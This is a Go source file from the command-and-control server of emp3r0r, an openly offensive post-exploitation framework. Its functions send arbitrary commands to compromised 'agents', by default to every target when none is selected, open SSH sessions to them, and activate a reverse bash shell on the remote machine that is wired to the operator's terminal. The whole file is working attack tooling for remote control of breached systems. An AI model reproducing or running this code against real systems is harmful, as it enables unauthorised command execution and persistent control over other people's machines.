package cc

import (
	"fmt"
	"time"

	"github.com/google/uuid"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
)

// RShellStatus stores errors from reverseBash
var RShellStatus = make(map[string]error)

// moduleCmd exec cmd on target
func moduleCmd() {
	// send command
	execOnTarget := func(target *emp3r0r_data.SystemInfo) {
		if Targets[target].Conn == nil {
			CliPrintError("moduleCmd: agent %s is not connected", target.Tag)
			return
		}
		var data emp3r0r_data.MsgTunData
		data.Payload = "cmd" + emp3r0r_data.OpSep + Options["cmd_to_exec"].Val
		data.Tag = target.Tag
		err := Send2Agent(&data, target)
		if err != nil {
			CliPrintError("moduleCmd: %v", err)
		}
	}

	// find target
	target := CurrentTarget
	if target == nil {
		CliPrintWarning("emp3r0r will execute `%s` on all targets this time", Options["cmd_to_exec"].Val)
		for target := range Targets {
			execOnTarget(target)
		}
		return
	}

	// write to given target's connection
	if Targets[target] == nil {
		CliPrintError("moduleCmd: agent control interface not found")
		return
	}
	execOnTarget(target)
}

// moduleShell set up an ssh session
func moduleShell() {
	// find target
	target := CurrentTarget
	if target == nil {
		CliPrintError("moduleShell: Target does not exist")
		return
	}

	// write to given target's connection
	tControl := Targets[target]
	if tControl == nil {
		CliPrintError("moduleShell: agent control interface not found")
		return
	}
	if tControl.Conn == nil {
		CliPrintError("moduleShell: agent is not connected")
		return
	}

	// options
	shell := Options["shell"].Val
	port := Options["port"].Val

	// run
	err := SSHClient(shell, port)
	if err != nil {
		CliPrintError("moduleShell: %v", err)
	}
}

func cmdBash() (err error) {
	// activate reverse shell in agent
	token := uuid.New().String()
	RShellStream.Token = token
	cmd := fmt.Sprintf("bash %s", token)
	err = SendCmd(cmd, CurrentTarget)
	if err != nil {
		CliPrintError("Cannot activate reverse shell on remote target: %v", err)
		return
	}

	// wait for agent to send shell
	for {
		if RShellStatus[token] != nil {
			CliPrintError("\n[-] An error occured: %v\n", RShellStatus[token])
			return RShellStatus[token]
		}
		if RShellStream.H2x.Ctx != nil && RShellStream.H2x.Conn != nil {
			break
		}
		time.Sleep(200 * time.Millisecond)
	}

	// set up local terminal to use remote bash shell
	send := make(chan []byte)
	reverseBash(RShellStream.H2x.Ctx, send, RShellStream.Buf)
	time.Sleep(1 * time.Second)

	return
}
